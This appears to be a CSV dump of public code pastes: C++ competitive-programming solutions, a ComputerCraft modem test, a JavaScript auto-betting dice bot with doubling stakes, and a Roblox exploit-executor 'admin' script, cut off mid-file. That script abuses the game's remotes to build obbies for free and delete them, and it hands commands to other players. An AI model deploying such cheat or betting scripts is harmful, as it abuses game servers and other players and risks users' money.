id,title,username,language,date,content
fUtu1kKx,Untitled,lodha1503,C++,Saturday 19th of August 2023 12:24:42 PM CDT,"#include <bits/stdc++.h> 
using namespace std;
#define ll long long
#define pb push_back
#define MOD1 1000000007
#define MOD2 998244353
#define NO cout << ""NO"" << endl
#define YES cout << ""YES"" << endl
ll expo(ll a, ll b, ll mod) {ll res = 1; while (b > 0) {if (b & 1)res = (res * a) % mod; a = (a * a) % mod; b = b >> 1;} return res;}
ll mminvprime(ll a, ll b) {return expo(a, b - 2, b);}
ll mod_add(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a + b) % m) + m) % m;}
ll mod_mul(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a * b) % m) + m) % m;}
ll mod_sub(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a - b) % m) + m) % m;}
ll mod_div(ll a, ll b, ll m) {a = a % m; b = b % m; return (mod_mul(a, mminvprime(b, m), m) + m) % m;}
void print(vector<int> &ans){for(auto x: ans) cout<<x<<"" ""; cout<<endl;}
 
// ========================================================================


void solve()
{
    
    int n;string s;
    cin>>n;
    cin>>s;
    if(n%2!=0)
    {
        cout<<-1<<endl;
        return;
    }
    vector<int> hm(26,0);
    vector<int> rep(26,0);
    
    for(int i=0;i<n;i++)
    {
        hm[s[i]-'a']+=1;
        
        if(hm[s[i]-'a']>n/2)
        {
            cout<<-1<<endl;
            return;
        }
    }
    
    for(int i=0;i<int(n/2);i++)
    {
        if(s[i] == s[n-i-1])
            rep[s[i]-'a']+=1;
    }
    
    vector<int> _rep;
    for(int i=0;i<26;i++)
    {
        if(rep[i]!=0)
            _rep.push_back(rep[i]);
    }
        
    if(_rep.size()==0)
    {
        cout<<0<<endl;
        return;
    }
    
    if(_rep.size()==1)
    {
        cout<<_rep[0]<<endl;
        return;
    }
    sort(_rep.begin(),_rep.end());
    int n1=_rep.size();
    vector<int> prefix(n1,0);
    vector<int> suffix(n1,0);
    
    prefix[0]=_rep[0];
    suffix[n1-1]=_rep[n1-1];
    
    for(int i=1;i<n1;i++)
        prefix[i]=prefix[i-1]+_rep[i];
    
    for(int i=n1-2;i>=0;i--)
        suffix[i]=suffix[i+1]+_rep[i];
        
    
        
    
    
    
    
    
    
    int ind=0;
   
    for(int i=n1-1;i>0;i--)
    {
   
        if(suffix[i] == prefix[i-1])
        {
            cout<<suffix[i]<<endl;
            return;
        }
        else if(suffix[i] > prefix[i-1])
        {
            ind=i;
            break;
        }
    }
    
    
    cout<<prefix[ind-1]+int(ceil((1.0*suffix[ind]-prefix[ind-1])/2))<<endl;

    
    
    
    
  
}


int main()
{
    int T;cin>>T;
    while(T--)
    {
        solve();
    }
}
"
a2RNRAi7,modemtest.lua,Braresa,Lua,Saturday 19th of August 2023 12:24:15 PM CDT,"peripheral.find(""modem"", rednet.open)

local sides = {
    ""left"",
    ""right"",
    ""top"",
    ""bottom"",
    ""front"",
    ""back"",
}

for i,v in ipairs(sides) do
    if rednet.isOpen(v) then
        print(""Modem aberto em ""..v)
    end
end

local function getMessages()
    while true do
        local id, message = rednet.receive(nil, 0.1)
        print(id, message)
        coroutine.yield()
    end
end

local function sendMessages()
    while true do
        write(""Mensagem: "")
        local message = read()
        rednet.broadcast(message)
        coroutine.yield()
    end
end

local getCoroutine = coroutine.create(getMessages)
local sendCoroutine = coroutine.create(sendMessages)

while true do
    coroutine.resume(getCoroutine)
    coroutine.resume(sendCoroutine)
end"
vnfU5F1J,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 11:02:59 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 2e5;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

int x = 0;

bool isValid(int a, int b, int n)
{
    return ((a < n && a >= 0) && (b < n && b >= 0));
}


int dfs(vector<vi> &grid, vector<vb> &visited, int a, int b)
{
    visited[a][b] = true;
    int ans = 1;

    for (auto i : moves)
    {
        int x = a + i.F;
        int y = b + i.S;
        if (isValid(x, y, grid.size()))
            if (!visited[x][y])
            {
                ans = 1 + dfs(grid, visited, x, y);
            }
    }
    return ans;
}

void solve()
{
    int n, a, b;
    cin >> n >> a >> b;
    a--;
    b--;

    vector<vi> grid(n, vi(n));
    vector<vb> visited(n, vb(n, false));

    int ans = 1;

    for (auto i : moves)
    {
        if (isValid(a + i.F, b + i.S, n))
            ans = max(ans, dfs(grid, visited, a + i.F, b + i.S));
        f(i, 0, n)
        {
            f(j, 0, n)
            {
                visited[i][j] = false;  
            }
        }
    }
    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    // gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}"
mqdQT9jd,snowy awesome,coinwalk,JavaScript,Saturday 19th of August 2023 10:54:00 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var brick = kozster;
var gobbie = kozster/240; //basebet;
var zeggar = gobbie;
var target = 350;
var tens = (gobbie*10);
var sevens = (gobbie*6.9);
var tuba = ((Math.floor(kozster/tens))*tens);
var bitz = kozster;
var burgzie = kozster;
var belcom = kozster;
var love = kozster;
var lolz = gobbie*1000;
var bone = (((Math.floor(kozster/tens))*tens)-(tens*2));
var tubist = ((Math.floor(kozster/tens))*tens);
var razzle;
var zen = 0;
var upper = 6.9;
var lower = 2.9;
var junky = kozster;
var bonie = kozster;
var adst = (gobbie*1000).toPrecision(1).toString();
var blade = adst.length+1;
var joe = $($(""#me>div>.betid"")[0]).text();
var boggart = 0;
var bear = true;
var oldDegen = 0;
 
function dobet(){
burgzie = $('#pct_balance').val();
if (burgzie>(tuba+(zeggar*upper))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if (burgzie<(tuba-(zeggar*lower))){
    zeggar = zeggar*2;
    upper = 4.9;
    lower = 4.9;
    tuba = parseFloat(burgzie);
}
if (((burgzie-(zeggar*40)<=0)&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens)))||((zeggar>=(kozster/20))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens)))){
    zeggar = gobbie;
    upper = 6.9;
    lower = 2.9;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
return ((zeggar*1).toFixed(8));
}
 
function go(){
var xox = $('#pct_balance').val();
razzle = dobet();
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo')[0].click();
console.log(""snowybot active"");
if (xox>=target) {
console.log(""snowybot rocks target done"");
return;
}
setTimeout(() => go(), 1);
}
go();
 "
nKheFj3Z,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 10:43:10 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x)              \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 1e6;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
vb sieve(N + 5, true);
vi primes;
void gensieve()
{
    sieve[0] = sieve[1] = false;
    for (int i = 2; i <= sqrt(N); i++)
    {
        if (sieve[i])
        {
            for (int j = i * i; j <= N; j += i)
                sieve[j] = false;
        }
    }
    for (int i = 2; i <= N; i++)
    {
        if (sieve[i])
            primes.pb(i);
    }
}
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

// vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}, {1, 1}, {1, -1}, {-1, 1}, {-1, -1}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

void solve()
{
    int n;
    cin >> n;

    vi v(n);
    input(v);

    vi prefix = v;
    vi suffix = v;

    reverse(all(suffix));

    f(i, 1, n)
    {
        prefix[i] = __gcd(prefix[i - 1], prefix[i]);
        suffix[i] = __gcd(suffix[i - 1], suffix[i]);
    }

    reverse(all(suffix));
    debug(prefix);
    debug(suffix);

    vi nums;
    nums.pb(suffix[1]);

    for(int i = 1; i <= n - 2; i++)
    {
        int x = __gcd(prefix[i - 1], suffix[i + 1]);
        nums.pb(x);
    }

    nums.pb(prefix[n - 2]);

    debug(nums);
    int mini = LLONG_MAX;

    f(i, 0, n)
    {
        if(sieve[nums[i]])
        {
            mini = min(mini, 1LL);
            continue;
        }

        int cnt = 0;

        int x = nums[i];
        int limit = sqrt(x);

        for(auto p: primes)
        {
            if(p > limit) break;
            while(x % p == 0) 
            {
                x /= p;
                cnt++;
            }
        }

        mini = min(mini, cnt);
    }
    dbg(mini);
    if(mini >= 2) println(""BOB"");
    else println(""DRAW"");
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}
"
esix9dbV,Build an Obby ADMIN REMAKE,2AreYouMental110,Lua,Saturday 19th of August 2023 10:33:47 AM CDT,"-- https://www.roblox.com/games/1526094849/Build-an-Obby
local autowhitelistfriends = true
local prefix = "".""
local prefix2 = "".""
local successmessage = ""Success""
local whitelistmessage = ""You have been whitelisted, do ""..prefix2..""cmds for the cmds""
local autowhitelistmessage = ""You have been automatically whitelisted, do ""..prefix2..""cmds for the cmds""
local unwhitelistmessage = ""Admin has ended, wait for the owner to re-whitelist you.""
local canwhitelistmessage = ""You have been granted permission to whitelist/unwhitelist anyone!""
local costmoney = false
local enablerconsole = true


local localplr = game.Players.LocalPlayer
local wl = {}
local otherplrmessage
local localplrmessage
local cmds = {}
local cmddesc = {}
cmddesc[""premadeobbies""] = ""ladder, free money obby v2, free money obby v2 (20 obby version), free money obby, ladder, bruh""
local localplrtable = {}
local supportgetgenv = false
local supportfiles = false
local supportsrconsole = false
function notify(title,text)
    if text then
        game:GetService(""StarterGui""):SetCore(""SendNotification"",{Title=title,Text=text})
    else
        game:GetService(""StarterGui""):SetCore(""SendNotification"",{Title=title,Text=title})
    end
end
notify(""Starting Script.."")
function endfunc()
    print(endfunc)
end
function add()
    print(add)
end
function updatewhitelistmessage()
    whitelistmessage = ""You have been whitelisted, do ""..prefix2..""cmds for the cmds""
    autowhitelistmessage = ""You have been automatically whitelisted, do ""..prefix2..""cmds for the cmds""
    if supportgetgenv then
        getgenv().whitelistmessage = whitelistmessage
        getgenv().autowhitelistmessage = autowhitelistmessage
    end
end
function splittext(txt)
    local txttable = {}
    if string.len(txt) < 200 then
        return {txt}
    else
        repeat
            wait()
            local str = string.sub(txt,1,175)
            table.insert(txttable,str)
            txt = string.sub(txt,176)
        until string.len(txt) < 175
        table.insert(txttable,txt)
        return txttable
    end
end
local success,err = pcall(function()
    if typeof(getgenv()) == ""table"" then
        supportgetgenv = true
    end
end)
local success,err = pcall(function()
    if typeof(appendfile) == ""function"" and typeof(writefile) == ""function"" then
        supportfiles = true
    end
end)
local success,err = pcall(function()
    if typeof(rconsoleprint) == ""function"" then
        supportsrconsole = true
    end
end)
if supportgetgenv then
    if getgenv().endfunc then
        notify(""Closing out of other script.."")
        getgenv().endfunc()
    end
    if getgenv().prefix then
        prefix = getgenv().prefix
    end
    getgenv().prefix = prefix
    if getgenv().prefix2 then
        prefix2 = getgenv().prefix2
        updatewhitelistmessage()
    end
    getgenv().prefix2 = prefix2
    if getgenv().costmoney then
        costmoney = getgenv().costmoney
    end
    getgenv().costmoney = costmoney
    if getgenv().farmlevels then
        farmlevels = getgenv().farmlevels
    end
    getgenv().enablerconsole = enablerconsole
    if getgenv().enablerconsole then
        enablerconsole = getgenv().enablerconsole
    end
    getgenv().enablerconsole = enablerconsole
    if getgenv().whitelistmessage then
        whitelistmessage = getgenv().whitelistmessage
    end
    getgenv().whitelistmessage = whitelistmessage
    if getgenv().unwhitelistmessage then
        unwhitelistmessage = getgenv().unwhitelistmessage
    end
    getgenv().unwhitelistmessage = unwhitelistmessage
    if getgenv().canwhitelistmessage then
        canwhitelistmessage = getgenv().canwhitelistmessage
        getgenv().canwhitelistmessage = canwhitelistmessage
    end
    getgenv().canwhitelistmessage = canwhitelistmessage
    if getgenv().autowhitelistfriends then
        autowhitelistfriends = getgenv().autowhitelistfriends
    end
    getgenv().autowhitelistfriends = autowhitelistfriends
    if getgenv().autowhitelistmessage then
        autowhitelistmessage = getgenv().autowhitelistmessage
    end
    getgenv().autowhitelistmessage = autowhitelistmessage
end
if supportfiles then
    add = function(strings,file)
        appendfile(file,tostring(strings))
        appendfile(file,[[
    
    ]])
    end
    writefile(""buildanobbystats.lua"","""")
end
if supportsrconsole and enablerconsole then
    rconsoleclear()
    rconsolename(""Build an Obby"")
    rconsoleprint(""@@LIGHT_BLUE@@"")
rconsoleprint([[
Credits: https://www.youtube.com/watch?v=B87hxW_vMJI
some part of the whitelist section by infinite yield

Current Cmds:

end (no prefix) - ends the whole thing

]])
else
print([[
Credits: https://www.youtube.com/watch?v=B87hxW_vMJI
some part of the whitelist section by infinite yield

Current Cmds:

end (no prefix) - ends the whole thing

]])
end
function sayto(plrname,text)
    print(plrname,text)
    if plrname == localplr.Name then
        notify(text)
    else
        print(""/w ""..plrname.."" ""..text)
        game:GetService(""ReplicatedStorage"").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""/w ""..plrname.."" ""..text,""All"")
    end
end
function success(plrname,text)
    if plrname:lower() == localplr.Name:lower() then
        if text then
            notify(successmessage,text)
        else
            notify(successmessage)
        end
    else
        sayto(plrname,successmessage)
    end
end
function makecmd(cmdname,description,whitelist,needsargs,func)
    cmds[cmdname] = {whitelist,needsargs,func}
    cmddesc[cmdname] = description
end
function findobj(txt,parent)
    for i,v in pairs(parent:GetChildren()) do
        if v.Name:lower() == txt then
            return v
        end
    end
    for i,v in pairs(parent:GetChildren()) do
        if string.sub(v.Name,1,string.len(txt)) == txt then
            return v
        end
    end
    for i,v in pairs(parent:GetChildren()) do
        if string.find(v.Name:lower(),txt:lower()) then
            return v
        end
    end
    return false
end
function getplayer(txt,player)
    if not txt or not player then return nil end
    if txt == ""all"" then
        return game.Players:GetPlayers()
    elseif txt == ""others"" then
        local plrs = {}
        for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= player then
                table.insert(plrs,v)
            end
        end
        return plrs
    elseif txt == ""me"" then
        return player
    elseif txt == ""random"" then
        return game.Players:GetPlayers()[math.random(1,#game.Players:GetPlayers())]
    else
        for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower() == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.sub(v.Name,1,string.len(txt)) == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.find(v.Name,txt) then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if v.DisplayName:lower() == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.sub(v.DisplayName,1,string.len(txt)) == txt then
                return v
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if string.find(v.DisplayName,txt) then
                return v
            end
        end
    end
    return nil
end
function combineargs(args)
    for i,v in pairs(args) do
        if i > 1 then
            args[1] = args[1].."" ""..v
        end
    end
    return args
end
--[[function getplayerwhitelisted(txt,player) unused
    local plrs = getplayer(txt,player)
    if typeof(plrs) == ""table"" then
        local newplrs = {}
        for i,v in pairs(plrs) do
            if wl[plrs.Name] then
                table.insert(newplrs,v)
            end
        end
    else
        if wl[plrs.Name] then
            return plrs
        end
    end
    return nil
end]]
function getplrtable(plr)
    if plr ~= localplr.Name then
        return wl[plr]
    else
        return localplrtable
    end
    return nil
end
makecmd(""selectplrobby"",""Selects a player's obby by its color. Example: selectplrobby Red"",true,true,function(plr,args)
    args = combineargs(args)
    local obby = findobj(args[1],workspace.Terrain.Obbyplot)
    local plrtable = getplrtable(plr)
    if obby and plrtable then
        plrtable.plrobby = obby.Name
        success(plr,obby:GetFullName())
    end
end)
makecmd(""selectobby"",""Selects an obby you can build, Example: selectobby Golden Goat Troll"",true,true,function(plr,args)
    args = combineargs(args)
    local obby = findobj(args[1],game.ReplicatedStorage.obys)
    local plrtable = getplrtable(plr)
    if obby and plrtable then
        plrtable.obby = obby.Name
        success(plr,obby:GetFullName())
    end
end)
makecmd(""buildobby"",""Build the obby, You need to have used selectobby and selectplrobby."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby and plrtable.obby then
        game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(plrtable.obby,plrtable.plrobby,0,0,-5,costmoney)
        success(plr)
    end
end)
makecmd(""selectxyz"",""Select an x,y,z by number, Example: selectxyz 1 1 1"",true,true,function(plr,args)
    local plrtable = getplrtable(plr)
    if args[1] and args[2] and args[3] and not string.find(args[1],""#"") and not string.find(args[2],""#"") and not string.find(args[3],""#"") then
        plrtable.x,plrtable.y,plrtable.z = args[1],args[2],args[3]
        success(plr)
    end
end)
makecmd(""buildobbyxyz"",""Build the obby using x,y,z, You need to have used selectobby, selectplrobby, and selectxyz."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.x and plrtable.y and plrtable.z then
        game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(plrtable.obby,plrtable.plrobby,plrtable.x,plrtable.y,plrtable.z,costmoney)
        success(plr)
    end
end)
makecmd(""whitelist"",""The whitelist command. Example: whitelist AreYouMental110"",true,true,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable ~= localplrtable then
        if not plrtable.canwhitelist then
            return
        end
    end
    local plr2 = getplayer(args[1],plr)
    if plr2 then
        local successful = false
        if typeof(plr2) == ""table"" then
            for i,v in pairs(plr2) do
                if not wl[v.Name] then
                    sayto(v.Name,whitelistmessage)
                    wl[v.Name] = {}
                end
            end
            successful = true
        else
            if not wl[plr2.Name] then
                sayto(plr2.Name,whitelistmessage)
                wl[plr2.Name] = {}
                successful = true
            else
                notify(""Already whitelisted ""..plr2.Name..""!"")
            end
        end
        if successful then
            success(plr)
        end
    end
end)
makecmd(""unwhitelist"",""The Unwhitelist command. Example: unwhitelist AreYouMental110"",true,true,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable ~= localplrtable then
        if not plrtable.canwhitelist then
            return
        end
    end
    local plr2 = getplayer(args[1],plr)
    if plr2 then
        local successful = false
        if typeof(plr2) == ""table"" then
            for i,v in pairs(plr2) do
                if wl[v.Name] then
                    sayto(v.Name,unwhitelistmessage)
                    wl[v.Name] = nil
                end
            end
            successful = true
        else
            if wl[plr2.Name] then
                sayto(plr2.Name,unwhitelistmessage)
                wl[plr2.Name] = nil
                successful = true
            end
        end
        if successful then
            success(plr)
        end
    end
end)
makecmd(""canwhitelist"",""Makes a person able to whitelist/unwhitelist, Example: canwhitelist AreYouMental110"",false,true,function(plr,args)
    local plrs = getplayer(args[1],plr)
    if plrs then
        if typeof(plrs) == ""table"" then
            for i,v in pairs(plrs) do
                local plrtable = getplrtable(v.Name)
                if plrtable then
                    plrtable.canwhitelist = true
                    sayto(v.Name,canwhitelistmessage)
                else
                    wl[v.Name] = {}
                    wl[v.Name].canwhitelist = true
                    sayto(v.Name,canwhitelistmessage)
                end
            end
            success(plr)
        else
            local plrtable = getplrtable(plrs.Name)
            if plrtable then
                plrtable.canwhitelist = true
                sayto(plrs.Name,canwhitelistmessage)
                success(plr)
            else
                wl[plrs.Name] = {}
                wl[plrs.Name].canwhitelist = true
                sayto(plrs.Name,canwhitelistmessage)
                success(plr)
            end
        end
    end
end)
makecmd(""deletefirstobby"",""Deletes the first obby. You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").removeobby:InvokeServer(1,plrtable.plrobby,0,0,-5,true)
        success(plr)
    end
end)
makecmd(""deletelastobby"",""Deletes the last obby. You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
